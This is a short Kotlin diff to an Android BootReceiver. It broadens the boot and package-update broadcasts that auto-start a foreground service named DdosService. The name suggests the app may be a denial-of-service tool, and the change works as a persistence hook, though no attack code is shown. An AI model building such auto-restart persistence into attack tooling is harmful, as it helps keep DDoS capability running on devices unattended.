@@ -12,11 +12,12 @@ class BootReceiver : BroadcastReceiver() {
 
         if (action == Intent.ACTION_BOOT_COMPLETED ||
             action == "android.intent.action.QUICKBOOT_POWERON" ||
-            action == Intent.ACTION_MY_PACKAGE_REPLACED) {
+            action == Intent.ACTION_MY_PACKAGE_REPLACED ||
+            action == "android.intent.action.PACKAGE_REPLACED") {
 
-            // Restart service on boot
+            // Start service immediately on boot
             val serviceIntent = Intent(context, DdosService::class.java)
-
+            
             if (Build.VERSION.SDK_INT >= 26) {
                 context.startForegroundService(serviceIntent)
             } else {
